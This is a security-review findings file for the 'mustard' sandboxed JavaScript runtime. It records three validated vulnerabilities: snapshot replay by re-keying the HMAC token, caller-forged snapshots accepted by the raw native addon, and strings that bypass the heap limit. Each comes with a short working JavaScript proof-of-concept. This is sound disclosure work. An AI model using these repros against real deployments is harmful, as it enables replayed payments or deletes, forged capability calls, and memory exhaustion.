# Security Issues 6

This file records validated findings from the sixth threat-model review on
2026-04-12.

Review method:

- Selected 14 primary trust-boundary files from the repository threat model.
- Ran one `gpt-5.4` `xhigh` hunter per target file.
- Collapsed duplicates and excluded documented non-goals plus issues already
  recorded in `SECURITY_ISSUES_5.md`.
- Ran separate skeptical verifier agents for the surviving issues.
- Reproduced the surviving issues locally with focused read-only repros before
  recording them here.

## Reviewed Targets

- [`native-loader.js`](native-loader.js)
- [`install.js`](install.js)
- [`lib/structured.js`](lib/structured.js)
- [`lib/policy.js`](lib/policy.js)
- [`lib/progress.js`](lib/progress.js)
- [`lib/runtime.js`](lib/runtime.js)
- [`crates/mustard-node/src/lib.rs`](crates/mustard-node/src/lib.rs)
- [`crates/mustard-sidecar/src/lib.rs`](crates/mustard-sidecar/src/lib.rs)
- [`crates/mustard-bridge/src/operations.rs`](crates/mustard-bridge/src/operations.rs)
- [`crates/mustard/src/runtime/validation/snapshot.rs`](crates/mustard/src/runtime/validation/snapshot.rs)
- [`crates/mustard/src/runtime/validation/bytecode.rs`](crates/mustard/src/runtime/validation/bytecode.rs)
- [`crates/mustard/src/runtime/conversions/boundary.rs`](crates/mustard/src/runtime/conversions/boundary.rs)
- [`crates/mustard/src/runtime/builtins/primitives.rs`](crates/mustard/src/runtime/builtins/primitives.rs)
- [`crates/mustard/src/runtime/vm.rs`](crates/mustard/src/runtime/vm.rs)

## Critical: the same dumped snapshot can be replayed by re-keying the token

**Affected files**

- [`lib/progress.js`](lib/progress.js)
- [`lib/policy.js`](lib/policy.js)
- [`crates/mustard-node/src/lib.rs`](crates/mustard-node/src/lib.rs)

**Impact**

The Node replay guard burns only the presented token string, not a canonical
snapshot identity. `Progress.load(...)` accepts any caller-supplied
`snapshotKey` as long as the token matches `HMAC(snapshot, snapshotKey)`, and
the raw native addon uses the same provided-key / provided-token check.

That means a snapshot consumed under key `A` can be replayed under key `B`
without changing the snapshot bytes at all. The same suspended host call can be
resumed again after the original `Progress` object is already burned, which
breaks the documented same-process single-use guarantee for approvals, payments,
deletes, and other one-shot flows.

**Validation notes**

- Local repro confirmed the original dumped blob is rejected as already used,
  but the same `snapshot` plus a fresh token under a different key resumes
  successfully and returns the result a second time.
- An independent verifier confirmed the issue and traced it to
  `USED_PROGRESS_SNAPSHOTS` burning only token strings while
  `assertSnapshotToken(...)` accepts any supplied key.
- The same root cause also explains replay variants based on non-semantic
  snapshot byte changes such as `snapshot_nonce`; those are not listed
  separately here.

**Short repro**

```js
const { Mustard, Progress } = require('./index.js');
const { snapshotToken } = require('./lib/policy.js');

const keyA = Buffer.from('key-one');
const keyB = Buffer.from('key-two');
const progress = new Mustard('const v = fetch_data(4); v * 2;').start({
  snapshotKey: keyA,
  capabilities: { fetch_data() {} },
});
const dumped = progress.dump();

console.log(progress.resume(4)); // 8

const replay = Progress.load(
  { snapshot: dumped.snapshot, token: snapshotToken(dumped.snapshot, keyB) },
  {
    snapshotKey: keyB,
    capabilities: { fetch_data(value) { return value; } },
    limits: {},
  },
);

console.log(replay.resume(4)); // 8 again
```

## Critical: raw native `inspectSnapshot(...)` / `resumeProgram(...)` self-authenticate caller-forged snapshots

**Affected files**

- [`crates/mustard-node/src/lib.rs`](crates/mustard-node/src/lib.rs)
- [`crates/mustard-bridge/src/operations.rs`](crates/mustard-bridge/src/operations.rs)
- [`crates/mustard/src/runtime/validation/policy.rs`](crates/mustard/src/runtime/validation/policy.rs)

**Impact**

The raw Node addon restore path treats a snapshot as “authenticated” when
`snapshot_token == HMAC(snapshot_bytes, snapshot_key_base64)`, but both values
come from the same caller-controlled policy JSON. There is no detached secret or
producer-bound token in this low-level path.

An attacker who can tamper with snapshot bytes can choose a new key, recompute
the token over the forged bytes, and then steer `inspectSnapshot(...)` or
`resumeProgram(...)` into accepting mutated suspended capability metadata as
long as the forged capability name is in the caller-supplied allowlist. That
reopens forged-snapshot capability steering for direct addon callers.

**Validation notes**

- Local control repro confirmed that the forged snapshot is rejected when the
  original key/token are reused against the mutated bytes.
- Local exploit repro confirmed that the same forged snapshot is accepted when
  the caller supplies an attacker-chosen key/token pair, and
  `inspectSnapshot(...)` reports the forged capability while `resumeProgram(...)`
  completes successfully from the forged state.
- An independent verifier confirmed the issue and traced it through the addon,
  bridge, and core policy-rebind path.

**Short repro**

```js
const crypto = require('node:crypto');
const { loadNative } = require('./native-loader.js');
const { Mustard } = require('./index.js');

function replaceAllAscii(buffer, from, to) {
  const source = Buffer.from(from);
  const target = Buffer.from(to);
  for (let i = 0; i <= buffer.length - source.length; i += 1) {
    if (buffer.subarray(i, i + source.length).equals(source)) {
      target.copy(buffer, i);
      i += source.length - 1;
    }
  }
}

const native = loadNative();
const progress = new Mustard('const value = fetch_data(7); value * 2;').start({
  snapshotKey: Buffer.from('original-key'),
  capabilities: { fetch_data() {} },
});

const forged = Buffer.from(progress.dump().snapshot);
replaceAllAscii(forged, 'fetch_data', 'drop_table');

const attackerKey = Buffer.from('attacker-chosen-key');
const policy = JSON.stringify({
  capabilities: ['drop_table'],
  limits: {},
  snapshot_key_base64: attackerKey.toString('base64'),
  snapshot_token: crypto.createHmac('sha256', attackerKey).update(forged).digest('hex'),
});

console.log(JSON.parse(native.inspectSnapshot(forged, policy)));
console.log(
  JSON.parse(
    native.resumeProgram(
      forged,
      JSON.stringify({ type: 'value', value: { Number: { Finite: 7 } } }),
      policy,
    ),
  ),
);
```

## High: bare string boundary values bypass `heapLimitBytes`

**Affected files**

- [`crates/mustard/src/runtime/conversions/boundary.rs`](crates/mustard/src/runtime/conversions/boundary.rs)
- [`crates/mustard/src/runtime/async_runtime/scheduler.rs`](crates/mustard/src/runtime/async_runtime/scheduler.rs)
- [`crates/mustard/src/runtime/exceptions.rs`](crates/mustard/src/runtime/exceptions.rs)

**Impact**

Bare `Value::String` instances do not receive heap-byte accounting when they
cross the structured host boundary directly. If the value is returned as the
root result or pushed directly by `resume(...)`, it can stay outside accounted
guest containers and cells while still being materialized as a large Rust
`String`.

That lets hostile capability results or hostile resume payloads bypass
`heapLimitBytes` and deliver multi-megabyte strings under tiny heap caps. The
same value fails correctly once it is first stored in guest state, so this is a
real top-level boundary-accounting gap rather than a general heap-limit miss.

**Validation notes**

- Local repro confirmed `fetch_data();` can return a `5_000_000` byte string
  successfully under `heapLimitBytes: 50_000`.
- Local control repro confirmed `const value = fetch_data(); value;` fails with
  `MustardLimitError: heap limit exceeded` under the same limit.
- An independent verifier confirmed the same gap for direct resume payloads and
  traced it through `root_result` handling plus `value_to_structured(...)`.
- [`docs/LIMITS.md`](docs/LIMITS.md) currently says direct top-level string
  returns should fail against the configured heap limit before crossing the host
  boundary.

**Short repro**

```js
const { Mustard } = require('./index.js');

(async () => {
  const result = await new Mustard('fetch_data();').run({
    capabilities: {
      fetch_data() {
        return 'x'.repeat(5_000_000);
      },
    },
    limits: {
      heapLimitBytes: 50_000,
      allocationBudget: 1_000_000,
      instructionBudget: 10_000_000,
      callDepthLimit: 1000,
      maxOutstandingHostCalls: 1,
    },
  });

  console.log(typeof result, result.length); // string 5000000
})();
```
